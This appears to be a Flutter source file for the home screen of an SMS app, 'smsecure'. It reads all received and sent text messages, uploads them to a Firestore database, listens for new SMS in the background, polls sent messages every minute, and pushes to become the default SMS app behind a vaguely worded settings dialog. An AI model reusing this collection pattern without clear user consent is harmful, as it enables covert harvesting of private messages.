import 'package:flutter/material.dart';
import 'package:another_telephony/telephony.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'dart:convert';
import 'package:flutter/services.dart';
import 'package:smsecure/Pages/CustomNavigationBar.dart';
import 'dart:async';

class HomePage extends StatefulWidget {
  const HomePage({Key? key}) : super(key: key);

  @override
  _HomePageState createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with WidgetsBindingObserver {
  final Telephony telephony = Telephony.instance;
  final FlutterSecureStorage secureStorage = const FlutterSecureStorage();
  final MethodChannel platform = const MethodChannel("com.tarumt.smsecure/sms");

  DateTime? lastIncomingMessageTimestamp;
  DateTime? lastOutgoingMessageTimestamp;
  final DateTime filterDate = DateTime(2024, 1, 1);
  bool _shouldShowDialog = false;
  bool _permissionsGranted = false;
  Timer? pollTimer;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);

    WidgetsBinding.instance.addPostFrameCallback((_) {
      _initialize();
    });
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    pollTimer?.cancel();
    super.dispose();
  }

  Future<void> _initialize() async {
    print("Initializing HomePage...");
    await _initializeFirebase();
    await _checkAndRequestPermissions();

    if (_permissionsGranted && mounted) {
      print("Permissions granted. Starting message listeners...");
      _startMessageListeners();
      await _checkAndSetDefaultSmsApp();
    }
  }

  Future<void> _initializeFirebase() async {
    try {
      await Firebase.initializeApp();
      print("Firebase initialized successfully.");
    } catch (e) {
      print("Error initializing Firebase: $e");
    }
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed && _shouldShowDialog) {
      if (mounted) {
        _showGoToSettingsDialog();
        setState(() => _shouldShowDialog = false);
      }
    }
  }

  Future<void> _checkAndSetDefaultSmsApp() async {
    try {
      final bool? isDefault = await platform.invokeMethod<bool?>('checkDefaultSms');
      print("Default SMS check: $isDefault");

      if (isDefault != null && !isDefault) {
        await platform.invokeMethod('setDefaultSms');
        if (mounted) {
          setState(() {
            _shouldShowDialog = true;
          });
        }
      }
    } catch (e) {
      print("Platform Exception during default SMS check: $e");
    }
  }

  Future<void> openAppSettings() async {
    try {
      await platform.invokeMethod('openAppSettings');
      print("Opened app settings.");
    } catch (e) {
      print("Error opening app settings: $e");
    }
  }

  Future<void> _checkAndRequestPermissions() async {
    _permissionsGranted = await telephony.requestPhoneAndSmsPermissions ?? false;
    print("Permissions granted: $_permissionsGranted");

    if (_permissionsGranted) {
      final isImported = await secureStorage.read(key: 'isMessagesImported') ?? 'false';
      if (isImported != 'true') {
        await _importSmsMessages();
        await secureStorage.write(key: 'isMessagesImported', value: 'true');
      }
    } else {
      if (mounted) setState(() => _shouldShowDialog = true);
    }
  }

  void _showGoToSettingsDialog() {
    if (mounted) {
      showDialog(
        context: context,
        builder: (context) => AlertDialog(
          title: const Text('Additional Configuration Needed'),
          content: const Text('Please configure additional settings for optimal app functionality.'),
          actions: <Widget>[
            TextButton(
              child: const Text('Open Settings'),
              onPressed: () {
                Navigator.of(context).pop();
                openAppSettings();
              },
            ),
            TextButton(
              child: const Text('Later'),
              onPressed: () {
                Navigator.of(context).pop();
              },
            ),
          ],
        ),
      );
    }
  }

  Future<void> _importSmsMessages() async {
    print("Importing SMS messages...");
    try {
      final incomingMessages = await telephony.getInboxSms(
        columns: [SmsColumn.ADDRESS, SmsColumn.BODY, SmsColumn.DATE_SENT, SmsColumn.DATE],
        filter: SmsFilter.where(SmsColumn.DATE).greaterThan(filterDate.millisecondsSinceEpoch.toString()),
      );
      final outgoingMessages = await telephony.getSentSms(
        columns: [SmsColumn.ADDRESS, SmsColumn.BODY, SmsColumn.DATE_SENT, SmsColumn.DATE],
        filter: SmsFilter.where(SmsColumn.DATE).greaterThan(filterDate.millisecondsSinceEpoch.toString()),
      );

      for (var message in incomingMessages) {
        await _storeSmsInFirestore(message, isIncoming: true);
      }
      for (var message in outgoingMessages) {
        await _storeSmsInFirestore(message, isIncoming: false);
      }
      print("SMS messages imported successfully.");
    } catch (e, stackTrace) {
      print('Error importing SMS messages: $e');
      print('Stack trace: $stackTrace');
    }
  }

  void _startMessageListeners() {
    print("Starting message listeners...");
    telephony.listenIncomingSms(
      onNewMessage: (SmsMessage message) async {
        await _storeSmsInFirestore(message, isIncoming: true);
      },
      onBackgroundMessage: _backgroundMessageHandler,
    );
    _startPollingSentMessages();
  }

  static Future<void> _backgroundMessageHandler(SmsMessage message) async {
    print("Handling background message...");
    if (Firebase.apps.isEmpty) {
      await Firebase.initializeApp();
    }
    await _storeSmsInFirestore(message, isIncoming: true);
  }

  void _startPollingSentMessages() {
    pollTimer = Timer.periodic(const Duration(minutes: 1), (_) async {
      print("Polling for sent messages...");
      await _pollSentMessages();
    });
  }

  Future<void> _pollSentMessages() async {
    try {
      final lastPollTime = lastOutgoingMessageTimestamp ?? filterDate;
      final sentMessages = await telephony.getSentSms(
        columns: [SmsColumn.ADDRESS, SmsColumn.BODY, SmsColumn.DATE_SENT, SmsColumn.DATE],
        filter: SmsFilter.where(SmsColumn.DATE).greaterThan(lastPollTime.millisecondsSinceEpoch.toString()),
      );

      for (var message in sentMessages) {
        await _storeSmsInFirestore(message, isIncoming: false);
        lastOutgoingMessageTimestamp = DateTime.fromMillisecondsSinceEpoch(
            message.dateSent ?? message.date ?? DateTime.now().millisecondsSinceEpoch);
      }
      print("Polling sent messages completed.");
    } catch (e, stackTrace) {
      print('Error polling sent messages: $e');
      print('Stack trace: $stackTrace');
    }
  }

  static Future<void> _storeSmsInFirestore(SmsMessage message, {required bool isIncoming}) async {
    try {
      final firestore = FirebaseFirestore.instance;
      final address = message.address;
      if (address == null || address.isEmpty) return;

      final conversationID = _generateConversationID(address);
      final messageID = _generateMessageID(message);
      final messageTimestamp = message.dateSent ?? message.date ?? DateTime.now().millisecondsSinceEpoch;

      final messageSnapshot = await firestore
          .collection('conversations')
          .doc(conversationID)
          .collection('messages')
          .doc(messageID)
          .get();

      if (!messageSnapshot.exists) {
        await firestore.collection('conversations')
            .doc(conversationID)
            .collection('messages')
            .doc(messageID)
            .set({
              'messageID': messageID,
              'senderID': isIncoming ? address : "+6011-55050925",
              'receiverID': isIncoming ? "+6011-55050925" : address,
              'content': message.body ?? "",
              'timestamp': messageTimestamp,
              'isIncoming': isIncoming,
            });
        print("Message stored in Firestore: $messageID");
      }
    } catch (e, stackTrace) {
      print('Firestore error: $e');
      print('Stack trace: $stackTrace');
    }
  }

  static String _generateConversationID(String? address) {
    return address?.replaceAll(RegExp(r'[^\w]+'), '') ?? "unknown";
  }

  static String _generateMessageID(SmsMessage message) {
    final timestamp = message.dateSent ?? message.date ?? DateTime.now().millisecondsSinceEpoch;
    final address = message.address ?? "unknown";
    final body = message.body ?? "";
    final bodyHash = base64UrlEncode(utf8.encode(body));
    return '${timestamp}_${address}_$bodyHash'.replaceAll('/', '_');
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text("Home")),
      body: const Center(child: Text("Welcome to Home Page")),
      bottomNavigationBar: Customnavigationbar(),
    );
  }
}
